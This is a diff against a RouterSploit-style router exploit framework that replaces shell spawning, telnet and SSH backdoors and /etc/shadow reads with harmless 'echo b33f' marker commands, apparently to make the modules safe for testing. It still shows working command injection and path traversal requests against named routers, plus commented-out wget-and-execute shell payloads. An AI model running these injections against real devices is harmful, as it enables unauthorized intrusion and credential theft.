+diff --git a/routersploit/modules/exploits/routers/belkin/n150_path_traversal.py b/routersploit/modules/exploits/routers/belkin/n150_path_traversal.py
+index 972cb64..2ea1f23 100644
+--- a/routersploit/modules/exploits/routers/belkin/n150_path_traversal.py
++++ b/routersploit/modules/exploits/routers/belkin/n150_path_traversal.py
+@@ -27,7 +27,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    filename = OptString("/etc/shadow", "File to read from filesystem")
++    filename = OptString("/etc/passwd", "File to read from filesystem")
+ 
+     def run(self):
+         if self.check():
+diff --git a/routersploit/modules/exploits/routers/belkin/n750_rce.py b/routersploit/modules/exploits/routers/belkin/n750_rce.py
+index 6a5ef3e..87024f6 100644
+--- a/routersploit/modules/exploits/routers/belkin/n750_rce.py
++++ b/routersploit/modules/exploits/routers/belkin/n750_rce.py
+@@ -27,7 +27,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f9")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/belkin/play_max_prce.py b/routersploit/modules/exploits/routers/belkin/play_max_prce.py
+index d713afe..f672a08 100644
+--- a/routersploit/modules/exploits/routers/belkin/play_max_prce.py
++++ b/routersploit/modules/exploits/routers/belkin/play_max_prce.py
+@@ -22,7 +22,8 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    cmd = OptString("telnetd", "Command to execute")
++    #cmd = OptString("telnetd", "Command to execute")
++    cmd = OptString("echo b33f10", "Command to execute")
+ 
+     def auth_bypass(self):
+         response = self.http_request(
+diff --git a/routersploit/modules/exploits/routers/bhu/bhu_urouter_rce.py b/routersploit/modules/exploits/routers/bhu/bhu_urouter_rce.py
+index ca252f0..db4ad69 100644
+--- a/routersploit/modules/exploits/routers/bhu/bhu_urouter_rce.py
++++ b/routersploit/modules/exploits/routers/bhu/bhu_urouter_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+             print_status('\t- Inject "CMD &gt; /usr/share/www/routersploit.check"')
+             print_status('\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))
+             print_status("Invoking command loop (type 'exit' or 'quit' to exit the loop)...")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f11")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error('Target is not vulnerable')
+ 
+diff --git a/routersploit/modules/exploits/routers/billion/billion_5200w_rce.py b/routersploit/modules/exploits/routers/billion/billion_5200w_rce.py
+index 012fc30..f35c3e4 100644
+--- a/routersploit/modules/exploits/routers/billion/billion_5200w_rce.py
++++ b/routersploit/modules/exploits/routers/billion/billion_5200w_rce.py
+@@ -39,19 +39,24 @@ class Exploit(HTTPClient, TelnetClient):
+         ]
+ 
+     def run(self):
+-        cmd = "utelnetd -l /bin/sh -p {} -d".format(self.telnet_port)
+-
++        cmd = "echo b33f12"
+         if self.execute1(cmd) or self.execute2(cmd):
+-            print_status("Trying to connect to the telnet server...")
+-
+-            telnet_client = self.telnet_create(port=self.telnet_port)
+-            if telnet_client.connect():
+-                telnet_client.interactive()
+-                telnet_client.close()
+-            else:
+-                print_error("Exploit failed - Telnet connection error: {}:{}".format(self.target, self.telnet_port))
++            print_status("send b33f")
+         else:
+             print_error("Exploit failed")
++        #cmd = "utelnetd -l /bin/sh -p {} -d".format(self.telnet_port)
++
++        #if self.execute1(cmd) or self.execute2(cmd):
++        #    print_status("Trying to connect to the telnet server...")
++
++        #    telnet_client = self.telnet_create(port=self.telnet_port)
++        #    if telnet_client.connect():
++        #        telnet_client.interactive()
++        #        telnet_client.close()
++        #    else:
++        #        print_error("Exploit failed - Telnet connection error: {}:{}".format(self.target, self.telnet_port))
++        #else:
++        #    print_error("Exploit failed")
+ 
+     def execute1(self, cmd):
+         print_status("Trying to exploit first command injection vulnerability...")
+diff --git a/routersploit/modules/exploits/routers/cisco/firepower_management60_rce.py b/routersploit/modules/exploits/routers/cisco/firepower_management60_rce.py
+index 16fe990..0973839 100644
+--- a/routersploit/modules/exploits/routers/cisco/firepower_management60_rce.py
++++ b/routersploit/modules/exploits/routers/cisco/firepower_management60_rce.py
+@@ -49,10 +49,11 @@ class Exploit(HTTPClient, SSHClient):
+                 if not self.newpassword:
+                     self.newpassword = utils.random_text(8)
+ 
+-                self.create_ssh_backdoor(self.newusername, self.newpassword)
++                self.execute("echo b33f13")
++                #self.create_ssh_backdoor(self.newusername, self.newpassword)
+ 
+-                # Log into the SSH backdoor account
+-                self.init_ssh_session(self.newusername, self.newpassword)
++                ## Log into the SSH backdoor account
++                #self.init_ssh_session(self.newusername, self.newpassword)
+             else:
+                 print_error("Exploit failed. Could not log in")
+         else:
+@@ -99,6 +100,32 @@ class Exploit(HTTPClient, SSHClient):
+         print_error("Exploit failed. Could not authenticate.")
+         return False
+ 
++    def execute(self, cmd):
++        sh_name = 'exploit.sh'
++        sf_action_id = self.get_sf_action_id()
++
++        payload = "{}; rm /var/sf/SRU/{}".format(cmd, sh_name)
++
++        print_status("Attempting to exploit.sh")
++
++        multipart_form_data = {
++            "action_submit": (None, "Import"),
++            "source": (None, "file"),
++            "manual_update": (None, "1"),
++            "sf_action_id": (None, sf_action_id),
++            "file": (sh_name, payload)
++        }
++
++        self.http_request(
++            method="POST",
++            path="/DetectionPolicy/rules/rulesimport.cgi",
++            files=multipart_form_data,
++            session=self.session
++        )
++
++        return
++
++
+     def create_ssh_backdoor(self, username, password):
+         sh_name = 'exploit.sh'
+         sf_action_id = self.get_sf_action_id()
+diff --git a/routersploit/modules/exploits/routers/cisco/ucs_manager_rce.py b/routersploit/modules/exploits/routers/cisco/ucs_manager_rce.py
+index 63da062..121042f 100644
+--- a/routersploit/modules/exploits/routers/cisco/ucs_manager_rce.py
++++ b/routersploit/modules/exploits/routers/cisco/ucs_manager_rce.py
+@@ -28,7 +28,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("echo b33f14")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dcs_930l_auth_rce.py b/routersploit/modules/exploits/routers/dlink/dcs_930l_auth_rce.py
+index ce9fced..ef4abc4 100644
+--- a/routersploit/modules/exploits/routers/dlink/dcs_930l_auth_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dcs_930l_auth_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection, response is not available")
+-            shell(self, architecture="mipsle")
++            self.execute("echo b33f15")
++            #shell(self, architecture="mipsle")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dir_300_320_600_615_info_disclosure.py b/routersploit/modules/exploits/routers/dlink/dir_300_320_600_615_info_disclosure.py
+index d5a188b..ae4e74c 100644
+--- a/routersploit/modules/exploits/routers/dlink/dir_300_320_600_615_info_disclosure.py
++++ b/routersploit/modules/exploits/routers/dlink/dir_300_320_600_615_info_disclosure.py
+@@ -30,17 +30,15 @@ class Exploit(HTTPClient):
+     def run(self):
+         response = self.http_request(
+             method="GET",
+-            path="/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"
++            path="/model/__show_info.php?REQUIRE_FILE=/etc/passwd"
+         )
+         if response is None:
+             return
+ 
+         creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response.text)
+ 
+-        if len(creds):
++        if utils.detect_file_content(response.text, "/etc/passwd"):
+             print_success("Credentials found!")
+-            headers = ("Login", "Password")
+-            print_table(headers, *creds)
+         else:
+             print_error("Credentials could not be found")
+ 
+@@ -48,14 +46,12 @@ class Exploit(HTTPClient):
+     def check(self):
+         response = self.http_request(
+             method="GET",
+-            path="/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"
++            path="/model/__show_info.php?REQUIRE_FILE=/etc/passwd"
+         )
+         if response is None:
+             return False  # target is not vulnerable
+ 
+-        creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response.text)
+-
+-        if len(creds):
++        if utils.detect_file_content(response.text, "/etc/passwd"):
+             return True  # target is vulnerable
+ 
+         return False  # target is not vulnerable
+diff --git a/routersploit/modules/exploits/routers/dlink/dir_300_600_rce.py b/routersploit/modules/exploits/routers/dlink/dir_300_600_rce.py
+index d7c8e9e..1b6fab1 100644
+--- a/routersploit/modules/exploits/routers/dlink/dir_300_600_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dir_300_600_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("echo b33f16")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dir_300_645_815_upnp_rce.py b/routersploit/modules/exploits/routers/dlink/dir_300_645_815_upnp_rce.py
+index dd9cf17..32b9c6d 100644
+--- a/routersploit/modules/exploits/routers/dlink/dir_300_645_815_upnp_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dir_300_645_815_upnp_rce.py
+@@ -30,7 +30,8 @@ class Exploit(UDPClient):
+             print_success("Target seems to be vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection, response is not available")
+-            shell(self, architecture="mipsle")
++            self.execute("echo b33f17")
++            #shell(self, architecture="mipsle")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dir_645_815_rce.py b/routersploit/modules/exploits/routers/dlink/dir_645_815_rce.py
+index 5bdaa81..bc5192b 100644
+--- a/routersploit/modules/exploits/routers/dlink/dir_645_815_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dir_645_815_rce.py
+@@ -34,7 +34,8 @@ class Exploit(HTTPClient):
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection, response is not available")
+-            shell(self, architecture="mipsle", method="echo", location="/var/tmp/")
++            self.execute("echo b33f18")
++            #shell(self, architecture="mipsle", method="echo", location="/var/tmp/")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dir_815_850l_rce.py b/routersploit/modules/exploits/routers/dlink/dir_815_850l_rce.py
+index eb993a0..7b0c68b 100644
+--- a/routersploit/modules/exploits/routers/dlink/dir_815_850l_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dir_815_850l_rce.py
+@@ -27,7 +27,8 @@ class Exploit(UDPClient):
+         print_status("It's not possible to check if the target is vulnerable. Try to use following command loop.")
+         print_status("Invoking command loop...")
+         print_status("It is blind command injection, response is not available")
+-        shell(self, architecture="mipsle")
++        self.execute("echo b33f19")
++        #shell(self, architecture="mipsle")
+ 
+     def execute(self, cmd):
+         request = (
+diff --git a/routersploit/modules/exploits/routers/dlink/dir_825_path_traversal.py b/routersploit/modules/exploits/routers/dlink/dir_825_path_traversal.py
+index 06a4b84..6e7914c 100644
+--- a/routersploit/modules/exploits/routers/dlink/dir_825_path_traversal.py
++++ b/routersploit/modules/exploits/routers/dlink/dir_825_path_traversal.py
+@@ -21,7 +21,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    filename = OptString("/etc/shadow", "File to read")  # file to read
++    filename = OptString("/etc/passwd", "File to read")  # file to read
+     username = OptString("admin", "Username to log in with")  # username - default: admin
+     password = OptString("", "Password to log in with")  # password - default: blank
+ 
+@@ -80,6 +80,7 @@ class Exploit(HTTPClient):
+             data=data,
+             auth=(self.username, self.password)
+         )
++
+         if response is None:
+             return False  # target is not vulnerable
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dns_320l_327l_rce.py b/routersploit/modules/exploits/routers/dlink/dns_320l_327l_rce.py
+index 7a36b5a..64dcb8f 100644
+--- a/routersploit/modules/exploits/routers/dlink/dns_320l_327l_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dns_320l_327l_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("echo b33f20")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dsl_2730_2750_path_traversal.py b/routersploit/modules/exploits/routers/dlink/dsl_2730_2750_path_traversal.py
+index 15cffdd..b55412a 100644
+--- a/routersploit/modules/exploits/routers/dlink/dsl_2730_2750_path_traversal.py
++++ b/routersploit/modules/exploits/routers/dlink/dsl_2730_2750_path_traversal.py
+@@ -24,7 +24,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    filename = OptString("/etc/shadow", "File to read")
++    filename = OptString("/etc/passwd", "File to read")
+ 
+     def run(self):
+         if self.check():
+diff --git a/routersploit/modules/exploits/routers/dlink/dsl_2750b_rce.py b/routersploit/modules/exploits/routers/dlink/dsl_2750b_rce.py
+index ba0ec81..56f6f6d 100644
+--- a/routersploit/modules/exploits/routers/dlink/dsl_2750b_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dsl_2750b_rce.py
+@@ -26,7 +26,8 @@ class Exploit(HTTPClient):
+     def run(self):
+         if self.check():
+             print_success("Target appears to be vulnerable")
+-            shell(self, architecture="mipsbe", method="wget", location="/tmp", exec_binary="chmod 777 {0} && {0} && rm {0}")
++            self.execute("echo b33f21")
++            #shell(self, architecture="mipsbe", method="wget", location="/tmp", exec_binary="chmod 777 {0} && {0} && rm {0}")
+ 
+     def execute(self, cmd):
+         path = "/login.cgi?cli=multilingual show';{}'$".format(cmd)
+diff --git a/routersploit/modules/exploits/routers/dlink/dsp_w110_rce.py b/routersploit/modules/exploits/routers/dlink/dsp_w110_rce.py
+index d121e35..a06605c 100644
+--- a/routersploit/modules/exploits/routers/dlink/dsp_w110_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/dsp_w110_rce.py
+@@ -28,7 +28,8 @@ class Exploit(HTTPClient):
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection, response is not available.")
+             print_status("Spawn root shell with telnetd -l/bin/sh")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f22")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/dlink/dvg_n5402sp_path_traversal.py b/routersploit/modules/exploits/routers/dlink/dvg_n5402sp_path_traversal.py
+index bdbac99..9aa4575 100644
+--- a/routersploit/modules/exploits/routers/dlink/dvg_n5402sp_path_traversal.py
++++ b/routersploit/modules/exploits/routers/dlink/dvg_n5402sp_path_traversal.py
+@@ -23,7 +23,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(8080, "Target HTTP port")
+ 
+-    filename = OptString('/etc/shadow', 'File to read')  # file to read
++    filename = OptString('/etc/passwd', 'File to read')  # file to read
+ 
+     def run(self):
+         # address and parameters
+@@ -61,7 +61,7 @@ class Exploit(HTTPClient):
+         # address and parameters
+         data = {
+             "getpage": "html/index.html",
+-            "*errorpage*": "../../../../../../../../../../../etc/shadow",
++            "*errorpage*": "../../../../../../../../../../../etc/passwd",
+             "var%3Amenu": "setup",
+             "var%3Apage": "connected",
+             "var%": "",
+@@ -79,7 +79,7 @@ class Exploit(HTTPClient):
+             data=data,
+         )
+ 
+-        if response and utils.detect_file_content(response.text, "/etc/shadow"):
++        if response and utils.detect_file_content(response.text, "/etc/passwd"):
+             return True  # target vulnerable
+ 
+         return False  # target not vulnerable
+diff --git a/routersploit/modules/exploits/routers/dlink/multi_hnap_rce.py b/routersploit/modules/exploits/routers/dlink/multi_hnap_rce.py
+index 50b259e..33c9ed7 100644
+--- a/routersploit/modules/exploits/routers/dlink/multi_hnap_rce.py
++++ b/routersploit/modules/exploits/routers/dlink/multi_hnap_rce.py
+@@ -42,7 +42,8 @@ class Exploit(HTTPClient):
+             print_status("Target might be vulnerable - it is hard to verify")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection, response is not available")
+-            shell(self, architecture="mipsle")
++            self.execute("echo b33f23")
++            #shell(self, architecture="mipsle")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/ipfire/ipfire_oinkcode_rce.py b/routersploit/modules/exploits/routers/ipfire/ipfire_oinkcode_rce.py
+index 10b4b20..7b82d01 100644
+--- a/routersploit/modules/exploits/routers/ipfire/ipfire_oinkcode_rce.py
++++ b/routersploit/modules/exploits/routers/ipfire/ipfire_oinkcode_rce.py
+@@ -31,10 +31,11 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self,
+-                  architecture="cmd",
+-                  method="cmd",
+-                  payload=["awk", "perl", "php", "python"])
++            self.execute("echo b33f24")
++            #shell(self,
++            #      architecture="cmd",
++            #      method="cmd",
++            #      payload=["awk", "perl", "php", "python"])
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/ipfire/ipfire_proxy_rce.py b/routersploit/modules/exploits/routers/ipfire/ipfire_proxy_rce.py
+index 27c9e0e..14cfa7d 100644
+--- a/routersploit/modules/exploits/routers/ipfire/ipfire_proxy_rce.py
++++ b/routersploit/modules/exploits/routers/ipfire/ipfire_proxy_rce.py
+@@ -31,10 +31,11 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self,
+-                  architecture="cmd",
+-                  method="cmd",
+-                  payloads=["awk"])
++            self.execute("echo b33f25")
++            #shell(self,
++            #      architecture="cmd",
++            #      method="cmd",
++            #      payloads=["awk"])
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/ipfire/ipfire_shellshock.py b/routersploit/modules/exploits/routers/ipfire/ipfire_shellshock.py
+index 647a0b8..7993865 100644
+--- a/routersploit/modules/exploits/routers/ipfire/ipfire_shellshock.py
++++ b/routersploit/modules/exploits/routers/ipfire/ipfire_shellshock.py
+@@ -33,7 +33,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("echo b33f26")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/linksys/1500_2500_rce.py b/routersploit/modules/exploits/routers/linksys/1500_2500_rce.py
+index b7a8298..414a0e4 100644
+--- a/routersploit/modules/exploits/routers/linksys/1500_2500_rce.py
++++ b/routersploit/modules/exploits/routers/linksys/1500_2500_rce.py
+@@ -31,7 +31,8 @@ class Exploit(HTTPClient):
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available")
+-            shell(self)
++            self.execute("echo b33f27")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/linksys/eseries_themoon_rce.py b/routersploit/modules/exploits/routers/linksys/eseries_themoon_rce.py
+index e77a4d5..7823f29 100644
+--- a/routersploit/modules/exploits/routers/linksys/eseries_themoon_rce.py
++++ b/routersploit/modules/exploits/routers/linksys/eseries_themoon_rce.py
+@@ -48,10 +48,11 @@ class Exploit(HTTPClient):
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available")
+-            if self.arch == "mipsbe":
+-                shell(self, architecture="mipsbe", method="wget", location="/tmp")
+-            elif self.arch == "mipsle":
+-                shell(self, architecture="mipsle", method="wget", location="/tmp")
++            self.execute("echo b33f28")
++            #if self.arch == "mipsbe":
++            #    shell(self, architecture="mipsbe", method="wget", location="/tmp")
++            #elif self.arch == "mipsle":
++            #    shell(self, architecture="mipsle", method="wget", location="/tmp")
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/linksys/wap54gv3_rce.py b/routersploit/modules/exploits/routers/linksys/wap54gv3_rce.py
+index 05c671f..ea1301f 100644
+--- a/routersploit/modules/exploits/routers/linksys/wap54gv3_rce.py
++++ b/routersploit/modules/exploits/routers/linksys/wap54gv3_rce.py
+@@ -28,7 +28,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("echo b33f29")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/linksys/wrt100_110_rce.py b/routersploit/modules/exploits/routers/linksys/wrt100_110_rce.py
+index e013f57..eedfccd 100644
+--- a/routersploit/modules/exploits/routers/linksys/wrt100_110_rce.py
++++ b/routersploit/modules/exploits/routers/linksys/wrt100_110_rce.py
+@@ -35,7 +35,8 @@ class Exploit(HTTPClient):
+             if self.test_auth():
+                 print_status("Invoking command loop...")
+                 print_status("This is blind command injection. Response is not available.")
+-                shell(self, architecture="mipsle")
++                self.execute("echo b33f30")
++                #shell(self, architecture="mipsle")
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/movistar/adsl_router_bhs_rta_path_traversal.py b/routersploit/modules/exploits/routers/movistar/adsl_router_bhs_rta_path_traversal.py
+index 336d5d1..f2102e6 100644
+--- a/routersploit/modules/exploits/routers/movistar/adsl_router_bhs_rta_path_traversal.py
++++ b/routersploit/modules/exploits/routers/movistar/adsl_router_bhs_rta_path_traversal.py
+@@ -22,7 +22,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    filename = OptString("/etc/shadow", "File to read")
++    filename = OptString("/etc/passwd", "File to read")
+ 
+     def run(self):
+         if self.check():
+diff --git a/routersploit/modules/exploits/routers/multi/gpon_home_gateway_rce.py b/routersploit/modules/exploits/routers/multi/gpon_home_gateway_rce.py
+index a0d93c3..898aa7c 100644
+--- a/routersploit/modules/exploits/routers/multi/gpon_home_gateway_rce.py
++++ b/routersploit/modules/exploits/routers/multi/gpon_home_gateway_rce.py
+@@ -27,7 +27,8 @@ class Exploit(HTTPClient):
+     def run(self):
+         if self.check():
+             print_success("Target seems to be vulnerable")
+-            shell(self, architecture="mipsbe", method="wget", location="/var/tmp/")
++            self.execute("echo b33f31")
++            #shell(self, architecture="mipsbe", method="wget", location="/var/tmp/")
+         else:
+             print_error("Exploit failed - target does not seem to be vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/multi/tcp_32764_rce.py b/routersploit/modules/exploits/routers/multi/tcp_32764_rce.py
+index c97adca..f4e55f7 100644
+--- a/routersploit/modules/exploits/routers/multi/tcp_32764_rce.py
++++ b/routersploit/modules/exploits/routers/multi/tcp_32764_rce.py
+@@ -52,7 +52,8 @@ class Exploit(TCPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("b33f32")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/netcore/udp_53413_rce.py b/routersploit/modules/exploits/routers/netcore/udp_53413_rce.py
+index 720b204..8efcbfb 100644
+--- a/routersploit/modules/exploits/routers/netcore/udp_53413_rce.py
++++ b/routersploit/modules/exploits/routers/netcore/udp_53413_rce.py
+@@ -28,7 +28,8 @@ class Exploit(UDPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self, architecture="mipsle", method="wget", location="/var")
++            self.execute("echo b33f33")
++            #shell(self, architecture="mipsle", method="wget", location="/var")
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/netgear/dgn2200_dnslookup_cgi_rce.py b/routersploit/modules/exploits/routers/netgear/dgn2200_dnslookup_cgi_rce.py
+index 4a1c9b2..3f8bcf8 100644
+--- a/routersploit/modules/exploits/routers/netgear/dgn2200_dnslookup_cgi_rce.py
++++ b/routersploit/modules/exploits/routers/netgear/dgn2200_dnslookup_cgi_rce.py
+@@ -32,7 +32,8 @@ class Exploit(HTTPClient):
+         print_status("It is not possible to check if target is vulnerable")
+         print_status("Trying to invoke command loop...")
+         print_status("It is blind command injection. Response is not available.")
+-        shell(self, architecture="mipsbe")
++        self.execute("echo$IFSb33f34")
++        #shell(self, architecture="mipsbe")
+ 
+     def execute(self, cmd):
+         payload = "www.google.com; {}".format(cmd)
+diff --git a/routersploit/modules/exploits/routers/netgear/dgn2200_ping_cgi_rce.py b/routersploit/modules/exploits/routers/netgear/dgn2200_ping_cgi_rce.py
+index 46b19c0..b79669b 100644
+--- a/routersploit/modules/exploits/routers/netgear/dgn2200_ping_cgi_rce.py
++++ b/routersploit/modules/exploits/routers/netgear/dgn2200_ping_cgi_rce.py
+@@ -32,7 +32,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f35")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/netgear/jnr1010_path_traversal.py b/routersploit/modules/exploits/routers/netgear/jnr1010_path_traversal.py
+index 89e6084..2e717fb 100644
+--- a/routersploit/modules/exploits/routers/netgear/jnr1010_path_traversal.py
++++ b/routersploit/modules/exploits/routers/netgear/jnr1010_path_traversal.py
+@@ -25,7 +25,7 @@ class Exploit(HTTPClient):
+     username = OptString("admin", "Username to log in")
+     password = OptString("password", "Password to log in")
+ 
+-    filename = OptString("/etc/shadow", "File to read")
++    filename = OptString("/etc/passwd", "File to read")
+ 
+     def run(self):
+         if self.check():
+diff --git a/routersploit/modules/exploits/routers/netgear/multi_rce.py b/routersploit/modules/exploits/routers/netgear/multi_rce.py
+index 36fc523..e537ef8 100644
+--- a/routersploit/modules/exploits/routers/netgear/multi_rce.py
++++ b/routersploit/modules/exploits/routers/netgear/multi_rce.py
+@@ -47,10 +47,11 @@ class Exploit(HTTPClient):
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>")
+ 
+-            if self.arch == "mipsbe":
+-                shell(self, architecture="mipsbe", method="wget", location="/tmp")
+-            elif self.arch == "mipsle":
+-                shell(self, architecture="mipsle", method="wget", location="/tmp")
++            self.execute("b33f36")
++            #if self.arch == "mipsbe":
++            #    shell(self, architecture="mipsbe", method="wget", location="/tmp")
++            #elif self.arch == "mipsle":
++            #    shell(self, architecture="mipsle", method="wget", location="/tmp")
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/netgear/prosafe_rce.py b/routersploit/modules/exploits/routers/netgear/prosafe_rce.py
+index d14b993..f31245a 100644
+--- a/routersploit/modules/exploits/routers/netgear/prosafe_rce.py
++++ b/routersploit/modules/exploits/routers/netgear/prosafe_rce.py
+@@ -30,7 +30,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self)
++            self.execute("echo b33f37")
++            #shell(self)
+         else:
+             print_error("Target is not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/netgear/r7000_r6400_rce.py b/routersploit/modules/exploits/routers/netgear/r7000_r6400_rce.py
+index c8a2828..e4c8f5f 100644
+--- a/routersploit/modules/exploits/routers/netgear/r7000_r6400_rce.py
++++ b/routersploit/modules/exploits/routers/netgear/r7000_r6400_rce.py
+@@ -35,7 +35,8 @@ class Exploit(HTTPClient):
+             print_success("Target is probably vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection. Try to start telnet with telnet telnetd -p '4445'")
+-            shell(self, architecture="armle")
++            self.execute("echo b33f38")
++            #shell(self, architecture="armle")
+         else:
+             print_error("Target is not vulnerable")
+ 
+@@ -56,11 +57,13 @@ class Exploit(HTTPClient):
+             path="/",
+         )
+ 
++        print(response)
++
+         if response is None:
+             return False  # target is not vulnerable
+ 
+         if "WWW-Authenticate" in response.headers.keys():
+-            if any(map(lambda x: x in response.headers['WWW-Authenticate'], ["NETGEAR R7000", "NETGEAR R6400"])):
++            if "NETGEAR" in response.headers['WWW-Authenticate'].upper():
+                 return True  # target is vulnerable
+ 
+         return False  # target is not vulnerable
+diff --git a/routersploit/modules/exploits/routers/netgear/wnr500_612v3_jnr1010_2010_path_traversal.py b/routersploit/modules/exploits/routers/netgear/wnr500_612v3_jnr1010_2010_path_traversal.py
+index 31c4131..2b43fd5 100644
+--- a/routersploit/modules/exploits/routers/netgear/wnr500_612v3_jnr1010_2010_path_traversal.py
++++ b/routersploit/modules/exploits/routers/netgear/wnr500_612v3_jnr1010_2010_path_traversal.py
+@@ -28,7 +28,7 @@ class Exploit(HTTPClient):
+     username = OptString("admin", "Username to log in")
+     password = OptString("password", "Password to log in")
+ 
+-    filename = OptString("/etc/shadow", "File to read")
++    filename = OptString("/etc/passwd", "File to read")
+ 
+     def run(self):
+         if self.check():
